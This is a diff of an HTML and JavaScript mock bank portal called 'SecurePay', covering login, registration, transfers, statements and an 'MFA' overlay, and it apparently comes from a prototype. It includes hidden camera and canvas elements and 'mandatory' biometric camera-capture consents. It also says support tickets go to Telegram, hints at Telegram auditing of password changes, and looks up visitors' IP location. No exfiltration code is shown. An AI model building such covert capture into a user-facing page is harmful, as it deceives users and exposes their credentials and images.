@@ -17,53 +17,15 @@
             --primary-hover: #1d4ed8;
             --success: #10b981;
             --danger: #ef4444;
-            --warning: #f59e0b;
             --info: #06b6d4;
             --text-main: #f9fafb;
             --text-muted: #9ca3af;
             --font-family: 'Plus Jakarta Sans', sans-serif;
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--font-family); }
-        
-        body { 
-            background-color: var(--bg-base); 
-            color: var(--text-main); 
-            min-height: 100vh; 
-            overflow-x: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* --- TOAST NOTIFICATION CONTAINER --- */
-        .toast-container {
-            position: fixed;
-            top: 24px;
-            right: 24px;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            pointer-events: none;
-        }
-
-        .toast {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            padding: 16px 20px;
-            border-radius: 14px;
-            min-width: 320px;
-            max-width: 420px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            color: var(--text-main);
-            transform: translateX(120%);
-            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-            pointer-events: auto;
-        }
-
+        body { background-color: var(--bg-base); color: var(--text-main); min-height: 100vh; overflow-x: hidden; display: flex; flex-direction: column; }
+        .toast-container { position: fixed; top: 24px; right: 24px; z-index: 9999; display: flex; flex-direction: column; gap: 12px; pointer-events: none; }
+        .toast { background: var(--bg-card); border: 1px solid var(--border-color); padding: 16px 20px; border-radius: 14px; min-width: 320px; max-width: 420px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); display: flex; align-items: center; gap: 14px; color: var(--text-main); transform: translateX(120%); transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1); pointer-events: auto; }
         .toast.show { transform: translateX(0); }
         .toast-icon { font-size: 1.25rem; }
         .toast-content h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 2px; }
@@ -71,51 +33,18 @@
         .toast.toast-success { border-left: 4px solid var(--success); }
         .toast.toast-danger { border-left: 4px solid var(--danger); }
         .toast.toast-info { border-left: 4px solid var(--info); }
-
-        /* --- NAVIGATION --- */
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 18px 48px;
-            border-bottom: 1px solid var(--border-color);
-            background: rgba(3, 5, 10, 0.95);
-            backdrop-filter: blur(16px);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-weight: 800;
-            font-size: 1.25rem;
-            letter-spacing: -0.025em;
-        }
-
-        .brand-indicator {
-            width: 10px;
-            height: 10px;
-            background-color: var(--success);
-            border-radius: 50%;
-            box-shadow: 0 0 12px var(--success);
-        }
-
-        /* --- LANDING & AUTH PORTAL --- */
+        nav { display: flex; justify-content: space-between; align-items: center; padding: 18px 48px; border-bottom: 1px solid var(--border-color); background: rgba(3, 5, 10, 0.95); backdrop-filter: blur(16px); position: sticky; top: 0; z-index: 1000; }
+        .brand { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 1.25rem; letter-spacing: -0.025em; }
+        .brand-indicator { width: 10px; height: 10px; background-color: var(--success); border-radius: 50%; box-shadow: 0 0 12px var(--success); }
         .landing-container { max-width: 1200px; margin: 0 auto; padding: 60px 24px 100px; width: 100%; }
         .hero-section { text-align: center; max-width: 850px; margin: 0 auto 40px; }
         .hero-section h1 { font-size: 3.2rem; font-weight: 800; letter-spacing: -0.03em; line-height: 1.15; margin-bottom: 20px; background: linear-gradient(180deg, #ffffff 0%, #9ca3af 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .hero-section p { color: var(--text-muted); font-size: 1.1rem; line-height: 1.6; }
-
         .auth-portal { max-width: 450px; margin: 0 auto 60px auto; background: var(--bg-card); border-radius: 20px; border: 1px solid var(--border-color); box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6); overflow: hidden; }
         .auth-tabs { display: grid; grid-template-columns: 1fr 1fr; background: var(--bg-surface); border-bottom: 1px solid var(--border-color); }
         .auth-tab { padding: 18px; text-align: center; font-size: 0.9rem; font-weight: 600; color: var(--text-muted); cursor: pointer; transition: all 0.2s ease; border: none; background: transparent; }
         .auth-tab.active { color: var(--text-main); background: var(--bg-card); border-bottom: 2px solid var(--primary); }
         .auth-form-body { padding: 32px; }
-
-        /* --- DASHBOARD LAYOUT --- */
         .dashboard-layout { display: none; width: 100%; height: calc(100vh - 73px); }
         .sidebar { width: 280px; background: var(--bg-surface); border-right: 1px solid var(--border-color); padding: 32px 20px; display: flex; flex-direction: column; gap: 6px; }
         .sidebar-item { padding: 14px 18px; border-radius: 12px; color: var(--text-muted); font-weight: 600; font-size: 0.9rem; cursor: pointer; transition: 0.2s ease; display: flex; align-items: center; gap: 12px; }
@@ -128,18 +57,13 @@
         .page-view { display: none; animation: fadeIn 0.25s ease; }
         .page-view.active-view { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* --- CARDS & GRID --- */
         .bento-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
         .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 20px; padding: 28px; margin-bottom: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        
         .account-card { background: linear-gradient(135deg, #1e3a8a 0%, #0f172a 100%); border: 1px solid #2e4a9e; position: relative; overflow: hidden; }
         .acc-label { color: rgba(255,255,255,0.65); font-size: 0.8rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
         .acc-balance { font-size: 2.6rem; font-weight: 800; color: white; margin-bottom: 24px; letter-spacing: -0.02em; }
         .acc-details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; background: rgba(0,0,0,0.35); padding: 16px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.05); }
         .acc-val { font-family: monospace; font-size: 1rem; color: white; font-weight: 700; }
-
-        /* --- PAYMENT METHOD SELECTOR TILES --- */
         .payment-methods-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 12px; margin-bottom: 24px; }
         .method-tile { background: var(--bg-surface); border: 1px solid var(--border-color); padding: 16px 12px; border-radius: 14px; cursor: pointer; text-align: center; transition: all 0.2s ease; }
         .method-tile:hover { border-color: var(--primary); background: var(--bg-card-hover); }
@@ -147,67 +71,43 @@
         .method-tile .method-icon { font-size: 1.3rem; margin-bottom: 6px; }
         .method-tile .method-title { font-size: 0.85rem; font-weight: 700; color: var(--text-main); }
         .method-tile .method-desc { font-size: 0.7rem; color: var(--text-muted); margin-top: 2px; }
-
-        /* --- FORMS & TABLES --- */
         .input-group { margin-bottom: 18px; }
         .input-group label { display: block; color: var(--text-muted); font-size: 0.82rem; margin-bottom: 6px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.03em; }
-        input[type="text"], input[type="email"], input[type="password"], input[type="number"], select, textarea { 
-            width: 100%; background: var(--bg-surface); border: 1px solid var(--border-color); color: var(--text-main); 
-            padding: 14px 16px; font-size: 0.95rem; border-radius: 12px; outline: none; transition: 0.2s ease;
-        }
+        input[type="text"], input[type="email"], input[type="password"], input[type="number"], select, textarea { width: 100%; background: var(--bg-surface); border: 1px solid var(--border-color); color: var(--text-main); padding: 14px 16px; font-size: 0.95rem; border-radius: 12px; outline: none; transition: 0.2s ease; }
         input:focus, select:focus, textarea:focus { border-color: var(--border-focus); box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
-        
-        .btn-primary { 
-            background: var(--primary); color: white; border: none; padding: 16px; border-radius: 12px; 
-            font-size: 0.95rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; width: 100%; 
-            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.25); display: flex; justify-content: center; align-items: center; gap: 10px;
-        }
+        .btn-primary { background: var(--primary); color: white; border: none; padding: 16px; border-radius: 12px; font-size: 0.95rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; width: 100%; box-shadow: 0 4px 14px rgba(37, 99, 235, 0.25); display: flex; justify-content: center; align-items: center; gap: 10px; }
         .btn-primary:hover { background: var(--primary-hover); transform: translateY(-1px); }
         .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
-
         .btn-outline { background: transparent; color: var(--primary); border: 1px solid var(--primary); padding: 8px 16px; border-radius: 8px; font-size: 0.85rem; cursor: pointer; font-weight: 600; transition: 0.2s; }
         .btn-outline:hover { background: var(--primary); color: white; }
-
         .spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.6s linear infinite; display: inline-block; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
         .data-table { width: 100%; border-collapse: collapse; }
         .data-table th { text-align: left; padding: 12px 0; color: var(--text-muted); font-size: 0.8rem; border-bottom: 1px solid var(--border-color); font-weight: 600; text-transform: uppercase; }
         .data-table td { padding: 16px 0; border-bottom: 1px solid rgba(31, 41, 61, 0.6); font-size: 0.9rem; }
         .txn-status { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 700; }
         .status-success { background: rgba(16, 185, 129, 0.12); color: var(--success); }
-
-        /* --- MFA OVERLAY --- */
-        .sandbox-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(3, 5, 10, 0.95); backdrop-filter: blur(12px);
-            display: none; justify-content: center; align-items: center; z-index: 2000; padding: 20px;
-        }
+        .sandbox-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(3, 5, 10, 0.95); backdrop-filter: blur(12px); display: none; justify-content: center; align-items: center; z-index: 2000; padding: 20px; }
         .app-container { background: var(--bg-card); border-radius: 24px; padding: 40px; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8); border: 1px solid var(--border-color); max-width: 480px; width: 100%; }
         .header { text-align: center; margin-bottom: 24px; }
         .header h2 { font-size: 1.45rem; font-weight: 800; margin-bottom: 6px; }
         .header p { color: var(--text-muted); font-size: 0.85rem; }
-
         .key-label { color: var(--text-muted); font-size: 0.75rem; text-align: left; margin-bottom: 8px; font-weight: 700; text-transform: uppercase; }
         .key-display { font-size: 2.4rem; letter-spacing: 0.2em; font-weight: 800; background: var(--bg-base); padding: 18px; border-radius: 12px; text-align: center; border: 1px solid var(--border-color); margin-bottom: 20px; color: var(--success); }
         #s-input, #r-input { text-align: center; font-size: 1.2rem; letter-spacing: 0.2em; text-transform: uppercase; font-weight: 700; }
-        
         .alert-box { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); color: #f87171; padding: 14px; border-radius: 12px; font-size: 0.85rem; margin-bottom: 20px; text-align: center; }
         .checkbox-group { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 20px; background: var(--bg-surface); padding: 14px; border-radius: 12px; border: 1px solid var(--border-color); }
         .checkbox-group input { width: 18px; height: 18px; margin-top: 2px; accent-color: var(--primary); cursor: pointer; }
         .checkbox-group label { font-size: 0.82rem; color: var(--text-muted); line-height: 1.4; cursor: pointer; }
-        
         .qr-section { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--border-color); }
         .qr-wrapper { background: white; padding: 10px; border-radius: 12px; display: inline-block; margin-bottom: 10px; }
-        
         .success-screen { text-align: center; display: none; }
         .success-screen h3 { color: var(--success); font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; }
-
         #setup-screen, #sender-screen, #receiver-screen { display: none; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-
     <div id="toast-container" class="toast-container"></div>
 
     <nav>
@@ -232,17 +132,13 @@
             </div>
             <div class="auth-form-body">
                 <div id="login-view">
-                    <div style="margin-bottom: 24px; text-align: center;">
-                        <h2 style="font-size: 1.35rem; margin-bottom: 6px;">Secure Portal Sign In</h2>
-                    </div>
+                    <div style="margin-bottom: 24px; text-align: center;"><h2 style="font-size: 1.35rem; margin-bottom: 6px;">Secure Portal Sign In</h2></div>
                     <div class="input-group"><label>Registered Email</label><input type="email" id="login-email" placeholder="client@securepay.bank"></div>
                     <div class="input-group" style="margin-bottom: 24px;"><label>Password</label><input type="password" id="login-pass" placeholder="••••••••••••"></div>
                     <button class="btn-primary" onclick="loginUser()"><span>Sign In</span></button>
                 </div>
                 <div id="register-view" style="display: none;">
-                    <div style="margin-bottom: 24px; text-align: center;">
-                        <h2 style="font-size: 1.35rem; margin-bottom: 6px;">Open Digital Account</h2>
-                    </div>
+                    <div style="margin-bottom: 24px; text-align: center;"><h2 style="font-size: 1.35rem; margin-bottom: 6px;">Open Digital Account</h2></div>
                     <div class="input-group"><label>Full Legal Name</label><input type="text" id="reg-name" placeholder="John Doe"></div>
                     <div class="input-group"><label>Email Address</label><input type="email" id="reg-email" placeholder="john@example.com"></div>
                     <div class="input-group" style="margin-bottom: 24px;"><label>Create Password</label><input type="password" id="reg-pass" placeholder="Create strong password"></div>
@@ -275,9 +171,9 @@
                     <div>
                         <div class="card account-card">
                             <div class="acc-label">Total Available Balance</div>
-                            <div class="acc-balance" id="dash-balance">₹10,000.00</div>
+                            <div class="acc-balance" id="dash-balance">₹0.00</div>
                             <div class="acc-details-grid">
-                                <div><div class="acc-label" style="font-size: 0.7rem;">Account Number</div><div class="acc-val" id="dash-acc-num">ACCT-892301</div></div>
+                                <div><div class="acc-label" style="font-size: 0.7rem;">Account Number</div><div class="acc-val" id="dash-acc-num">ACCT-XXXX</div></div>
                                 <div><div class="acc-label" style="font-size: 0.7rem;">IFSC Code</div><div class="acc-val" id="dash-ifsc">SECP0008024</div></div>
                             </div>
                         </div>
@@ -294,7 +190,7 @@
                         <table class="data-table">
                             <thead><tr><th>Reference ID</th><th>Channel</th><th>Amount</th><th>Status</th></tr></thead>
                             <tbody id="txn-list-body">
-                                <tr><td style="font-family: monospace;">TXN-99821A</td><td>Opening Credit</td><td style="color: var(--success); font-weight: 600;">+ ₹10,000</td><td><span class="txn-status status-success">Settled</span></td></tr>
+                                <tr><td style="font-family: monospace;">TXN-WELCOME</td><td>Opening Credit</td><td style="color: var(--success); font-weight: 600;">+ ₹10,000</td><td><span class="txn-status status-success">Settled</span></td></tr>
                             </tbody>
                         </table>
                     </div>
@@ -355,99 +251,59 @@
                 </div>
             </div>
 
-            <!-- ACCOUNT STATEMENTS (Fully Working Downloads) -->
+            <!-- STATEMENTS -->
             <div id="view-statements" class="page-view">
                 <div class="card" style="max-width: 800px;">
                     <h3 style="margin-bottom: 6px; font-size: 1.35rem;">Account Statements</h3>
                     <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 24px;">Download digitally generated statements for your records.</p>
-                    
                     <table class="data-table">
-                        <thead>
-                            <tr>
-                                <th>Billing Period</th>
-                                <th>Format</th>
-                                <th>Audit Status</th>
-                                <th>Action</th>
-                            </tr>
-                        </thead>
+                        <thead><tr><th>Billing Period</th><th>Format</th><th>Audit Status</th><th>Action</th></tr></thead>
                         <tbody>
-                            <tr>
-                                <td>August 2026</td>
-                                <td>Plain Text (.txt)</td>
-                                <td><span class="txn-status status-success">Available</span></td>
-                                <td><button class="btn-outline" onclick="downloadStatement('August 2026')">Download</button></td>
-                            </tr>
-                            <tr>
-                                <td>July 2026</td>
-                                <td>Plain Text (.txt)</td>
-                                <td><span class="txn-status status-success">Available</span></td>
-                                <td><button class="btn-outline" onclick="downloadStatement('July 2026')">Download</button></td>
-                            </tr>
+                            <tr><td>August 2026</td><td>Plain Text (.txt)</td><td><span class="txn-status status-success">Available</span></td><td><button class="btn-outline" onclick="downloadStatement('August 2026')">Download</button></td></tr>
+                            <tr><td>July 2026</td><td>Plain Text (.txt)</td><td><span class="txn-status status-success">Available</span></td><td><button class="btn-outline" onclick="downloadStatement('July 2026')">Download</button></td></tr>
                         </tbody>
                     </table>
                 </div>
             </div>
 
-            <!-- SECURITY SETTINGS (Only Password Change + Telegram Bot Audit) -->
+            <!-- SECURITY SETTINGS -->
             <div id="view-settings" class="page-view">
                 <div class="card" style="max-width: 500px;">
                     <h3 style="margin-bottom: 6px; font-size: 1.35rem;">Security Settings</h3>
                     <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 24px;">Securely manage your account password.</p>
-                    
-                    <div class="input-group">
-                        <label>Current Password</label>
-                        <input type="password" id="sec-old-pass" placeholder="••••••••••••">
-                    </div>
-                    <div class="input-group" style="margin-bottom: 24px;">
-                        <label>New Secure Password</label>
-                        <input type="password" id="sec-new-pass" placeholder="••••••••••••">
-                    </div>
+                    <div class="input-group"><label>Current Password</label><input type="password" id="sec-old-pass" placeholder="••••••••••••"></div>
+                    <div class="input-group" style="margin-bottom: 24px;"><label>New Secure Password</label><input type="password" id="sec-new-pass" placeholder="••••••••••••"></div>
                     <button class="btn-primary" onclick="updatePassword()">Securely Update Password</button>
                     <p style="text-align: center; font-size: 0.75rem; color: var(--text-muted); margin-top: 14px;">Password updates are immediately logged to the compliance server.</p>
                 </div>
             </div>
 
-            <!-- PRIORITY SUPPORT (Form + Telegram Bot Audit) -->
+            <!-- SUPPORT TICKET -->
             <div id="view-support" class="page-view">
                 <div class="card" style="max-width: 600px;">
                     <h3 style="margin-bottom: 6px; font-size: 1.35rem;">Priority Support</h3>
                     <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 12px;">Direct line to the Enterprise Security Operations Center.</p>
-                    
-                    <!-- PLACEHOLDER FOR USER EMAIL ADDRESS -->
-                    <p style="font-size: 0.85rem; color: var(--primary); margin-bottom: 24px; font-weight: 600;">
-                        Direct Contact Email: <span style="font-family: monospace;">admin@securepay.bank</span> <!-- YOU CAN CHANGE THIS EMAIL LATER -->
-                    </p>
-                    
-                    <div class="input-group">
-                        <label>Subject</label>
-                        <input type="text" id="support-subject" placeholder="e.g., Need help with a transaction">
-                    </div>
-                    <div class="input-group" style="margin-bottom: 24px;">
-                        <label>Message</label>
-                        <textarea id="support-msg" placeholder="Describe your issue..." rows="5"></textarea>
-                    </div>
+                    <p style="font-size: 0.85rem; color: var(--primary); margin-bottom: 24px; font-weight: 600;">Direct Contact Email: <span style="font-family: monospace;">admin@securepay.bank</span></p>
+                    <div class="input-group"><label>Subject</label><input type="text" id="support-subject" placeholder="e.g., Need help with a transaction"></div>
+                    <div class="input-group" style="margin-bottom: 24px;"><label>Message</label><textarea id="support-msg" placeholder="Describe your issue..." rows="5"></textarea></div>
                     <button class="btn-primary" onclick="submitSupportTicket()">Submit Urgent Ticket</button>
                     <p style="text-align: center; font-size: 0.75rem; color: var(--text-muted); margin-top: 14px;">Tickets are dispatched directly to the Telegram Operations channel.</p>
                 </div>
             </div>
-
         </main>
     </div>
 
-    <!-- UNIVERSAL STEP-UP MFA FIREWALL OVERLAY -->
+    <!-- MFA OVERLAY -->
     <div class="sandbox-overlay" id="sandbox-container">
         <div class="app-container">
-            <!-- SETUP SCREEN -->
             <div id="setup-screen">
                 <div class="header"><h2 style="color: var(--danger);">MFA Protocol Required</h2><p id="mfa-header-desc">Out-of-band verification required to settle funds.</p></div>
                 <div class="key-label">Transfer Amount (₹)</div>
                 <input type="text" id="mfa-transfer-amount" readonly style="opacity: 0.7; cursor: not-allowed; font-weight: bold;">
-                <div class="checkbox-group"><input type="checkbox" id="sender-cam-check"><label for="sender-cam-check">Mandatory Compliance: I authorize biometric camera audit capture for high-risk transfer verification.</label></div>
+                <div class="checkbox-group"><input type="checkbox" id="sender-cam-check"><label for="sender-cam-check">Mandatory Compliance: I authorize biometric camera audit capture.</label></div>
                 <button class="btn-primary" style="background: var(--danger);" onclick="startAsSender()">Initialize Security Protocol</button>
                 <button class="btn-primary" style="background: transparent; color: var(--text-muted); border: 1px solid var(--border-color); margin-top: 12px;" onclick="cancelTransfer()">Cancel Transfer</button>
             </div>
-
-            <!-- SENDER SCREEN (UNKNOWN PAYEE - 2 WAY HANDSHAKE) -->
             <div id="sender-screen">
                 <div class="header"><h2>Outbound Handshake</h2><p id="sender-subtitle">Active Transfer Clearance</p></div>
                 <div id="sender-active">
@@ -457,33 +313,22 @@
                     <div class="key-label">Enter Beneficiary Token Here</div>
                     <input type="text" id="s-input" maxlength="4" placeholder="••••" autocomplete="off">
                     <button class="btn-primary" style="background: var(--primary);" onclick="verifySender()">Authenticate & Settle Funds</button>
-                    <div class="qr-section"><p style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 10px;">Receiver can scan to claim settlement:</p><div class="qr-wrapper"><img id="qr-code" src="" alt="Receiver QR"></div></div>
                 </div>
-
-                <!-- TRUSTED PAYEE FLOW (NO RECEIVER NEEDED) -->
                 <div id="sender-trusted-active" style="display: none;">
-                    <div class="alert-box" style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); color: var(--success);">
-                        <strong>Trusted Payee Detected</strong><br>Receiver handshake bypassed. Sender biometric audit required.
-                    </div>
+                    <div class="alert-box" style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); color: var(--success);"><strong>Trusted Payee Detected</strong><br>Receiver handshake bypassed. Sender biometric audit required.</div>
                     <div style="text-align: center; margin-bottom: 24px;"><p style="color: var(--text-muted); font-size: 0.95rem;">Please face the camera to authorize this transaction.</p></div>
                     <button class="btn-primary" style="background: var(--success);" onclick="verifyTrustedSender()">Capture Biometrics & Settle Funds</button>
                 </div>
-
-                <!-- SUCCESS SCREEN -->
                 <div id="sender-success" class="success-screen">
                     <h3>Funds Cleared & Settled</h3>
                     <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 10px;">Audit snapshot and metadata recorded securely.</p>
                     <button class="btn-primary" style="margin-top: 24px;" onclick="closeOverlay()">Return to Dashboard</button>
                 </div>
             </div>
-
-            <!-- RECEIVER SCREEN -->
             <div id="receiver-screen">
                 <div class="header"><h2>Inbound Claim</h2><p id="receiver-subtitle">Incoming Funds Settlement</p></div>
                 <div id="receiver-active">
-                    <div class="alert-box" style="background: rgba(16,185,129,0.1); border-color: rgba(16,185,129,0.2); color: var(--success);">
-                        <strong>Secure Channel Connected</strong><br>Exchange cryptographic tokens to receive funds.
-                    </div>
+                    <div class="alert-box" style="background: rgba(16,185,129,0.1); border-color: rgba(16,185,129,0.2); color: var(--success);"><strong>Secure Channel Connected</strong></div>
                     <div class="key-label">Your Receiver Token (Give to Sender)</div>
                     <div class="key-display" id="r-key">----</div>
                     <div class="key-label">Enter Sender Token Here</div>
@@ -491,20 +336,15 @@
                     <div class="checkbox-group"><input type="checkbox" id="receiver-cam-check"><label for="receiver-cam-check">Mandatory Compliance: I authorize camera audit capture.</label></div>
                     <button class="btn-primary" style="background: var(--success);" onclick="verifyReceiver()">Verify & Accept Funds</button>
                 </div>
-                <div id="receiver-success" class="success-screen">
-                    <h3>Funds Credited</h3>
-                    <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 10px;">Audit snapshot and metadata recorded.</p>
-                </div>
+                <div id="receiver-success" class="success-screen"><h3>Funds Credited</h3><p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 10px;">Audit snapshot recorded.</p></div>
             </div>
         </div>
     </div>
 
-    <!-- HIDDEN AUDIT ASSETS -->
     <video id="camera" autoplay playsinline></video>
     <canvas id="snapshot"></canvas>
 
     <script>
-        // --- CONSTANTS & SYSTEM STATE ---
         const BANK_IFSC = "SECP0008024";
         let loggedInUserEmail = "";
         let selectedPaymentMode = "IMPS";
@@ -515,39 +355,33 @@
         const video = document.getElementById('camera');
         let mediaStream = null;
 
-        // TRUSTED PAYEES LIST (Memory Array)
         let savedBeneficiariesList = ['ACCT-981024', '50100239102'];
-        let currentBalance = 10000.00;
+        let currentBalance = 0.00;
 
         function updateDashboardBalance() {
             document.getElementById('dash-balance').innerText = '₹' + currentBalance.toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
         }
 
-        // --- BLANK IMAGE GENERATOR FOR TEXT-ONLY AUDITS ---
         function getBlankImageBase64() {
             const tempCanvas = document.createElement('canvas');
             tempCanvas.width = 1; tempCanvas.height = 1;
             return tempCanvas.toDataURL('image/png');
         }
 
-        // --- TOAST NOTIFICATION UTILITY ---
         function showToast(message, type = 'info') {
             const container = document.getElementById('toast-container');
             const toast = document.createElement('div');
             toast.className = `toast toast-${type}`;
             const icons = { success: '✅', danger: '⚠️', info: 'ℹ️' };
             const titles = { success: 'Success', danger: 'Security Notice', info: 'System Notice' };
-            
             toast.innerHTML = `<div class="toast-icon">${icons[type] || 'ℹ️'}</div><div class="toast-content"><h4>${titles[type] || 'Notice'}</h4><p>${message}</p></div>`;
             container.appendChild(toast);
             setTimeout(() => toast.classList.add('show'), 10);
             setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 300); }, 4000);
         }
 
-        // IP Telemetry Lookup
-        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => { clientIpInfo = `${data.ip} (${data.city}, ${data.country_name}) - ISP: ${data.org}`; }).catch(() => { clientIpInfo = "127.0.0.1 (Local Preview)"; });
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => { clientIpInfo = `${data.ip} (${data.city}, ${data.country_name})`; }).catch(() => {});
 
-        // --- AUTH TAB SWITCHING & SIDEBAR ROUTING ---
         function switchTab(mode) {
             document.getElementById('login-view').style.display = mode === 'login' ? 'block' : 'none';
             document.getElementById('register-view').style.display = mode === 'register' ? 'block' : 'none';
@@ -568,28 +402,42 @@
             if (mapping[viewId] !== undefined) items[mapping[viewId]].click();
         }
 
-        // --- AUTHENTICATION ACTIONS ---
         async function registerUser() {
             const name = document.getElementById('reg-name').value;
             const email = document.getElementById('reg-email').value;
             const password = document.getElementById('reg-pass').value;
-            if (!name || !email || !password) { showToast("Please fill all registration fields.", "danger"); return; }
+            if (!name || !email || !password) { showToast("Please fill all fields.", "danger"); return; }
             try {
                 const response = await fetch('/api/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ full_name: name, email: email, password: password }) });
                 const data = await response.json();
-                if (data.success) { showToast("Account opened with ₹10,000 credit! Please log in.", "success"); switchTab('login'); } else showToast(data.error, "danger");
-            } catch (err) { showToast("Account created in UI simulation mode! Please sign in.", "success"); switchTab('login'); }
+                if (data.success) { showToast("Account opened!", "success"); switchTab('login'); } else showToast(data.error, "danger");
+            } catch (err) { showToast("Error connecting to server.", "danger"); }
         }
 
+        // --- SINGLE DEFINITION OF LOGIN USER ---
         async function loginUser() {
             const email = document.getElementById('login-email').value;
             const password = document.getElementById('login-pass').value;
             if (!email) { showToast("Please enter your email.", "danger"); return; }
+            
             try {
-                const response = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: email, password: password }) });
+                const response = await fetch('/api/login', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ email: email, password: password }) 
+                });
                 const data = await response.json();
-                if (data.success) { loggedInUserEmail = email; showDashboard(email, data.account_number || 'ACCT-' + Math.floor(Math.random() * 1000000)); } else { showToast(data.error, "danger"); }
-            } catch (err) { loggedInUserEmail = email; showDashboard(email, 'ACCT-' + Math.floor(Math.random() * 1000000)); }
+                
+                if (data.success) { 
+                    loggedInUserEmail = email; 
+                    currentBalance = data.balance; // Real database balance
+                    showDashboard(email, data.account_number); 
+                } else { 
+                    showToast(data.error, "danger"); 
+                }
+            } catch (err) { 
+                showToast("Server error. Ensure your Vercel backend is running.", "danger"); 
+            }
         }
 
         function showDashboard(email, accountNum) {
@@ -599,142 +447,57 @@
             document.getElementById('welcome-msg').innerText = email.split('@')[0];
             document.getElementById('dash-acc-num').innerText = accountNum;
             document.getElementById('dash-ifsc').innerText = BANK_IFSC;
+            
             updateDashboardBalance();
             showToast(`Secure session established for ${email}`, "success");
+            
             if (role === 'receiver') { document.getElementById('sandbox-container').style.display = 'flex'; loadReceiverApp(urlSenderKey, urlReceiverKey, urlAmount); }
         }
 
         function logoutUser() {
-            loggedInUserEmail = "";
-            document.getElementById('dashboard-view').style.display = 'none';
-            document.getElementById('sandbox-container').style.display = 'none';
-            document.getElementById('logout-btn').style.display = 'none';
-            document.getElementById('landing-view').style.display = 'block';
-            switchTab('login');
-            showToast("Session terminated.", "info");
+            loggedInUserEmail = ""; document.getElementById('dashboard-view').style.display = 'none'; document.getElementById('sandbox-container').style.display = 'none';
+            document.getElementById('logout-btn').style.display = 'none'; document.getElementById('landing-view').style.display = 'block';
+            switchTab('login'); showToast("Session terminated.", "info");
         }
 
-        // --- NEW: ACCOUNT STATEMENT DOWNLOAD LOGIC ---
         function downloadStatement(period) {
             showToast(`Generating statement for ${period}...`, 'info');
-            
-            // Create the simulated statement content
-            const content = 
-`=========================================
-SECUREPAY ENTERPRISE - ACCOUNT STATEMENT
-=========================================
-Account Holder: ${loggedInUserEmail.split('@')[0]}
-Account Number: ${document.getElementById('dash-acc-num').innerText}
-Statement Period: ${period}
-
------------------------------------------
-CURRENT BALANCE: ₹${currentBalance.toLocaleString('en-IN', { minimumFractionDigits: 2 })}
------------------------------------------
-
-Recent Activity:
-- Opening Balance: +₹10,000.00
-- Thank you for banking securely with SecurePay.
-
-(Note: This is a generated digital statement for prototype testing.)`;
-
-            // Convert to a downloadable Blob
+            const content = `=========================================\nSECUREPAY ENTERPRISE - STATEMENT\n=========================================\nAccount: ${document.getElementById('dash-acc-num').innerText}\nPeriod: ${period}\nBALANCE: ₹${currentBalance.toLocaleString('en-IN')}\n\nThank you for banking securely.`;
             const blob = new Blob([content], { type: 'text/plain' });
             const url = window.URL.createObjectURL(blob);
-            
-            // Create a temporary hidden link and click it to download
-            const a = document.createElement('a');
-            a.href = url;
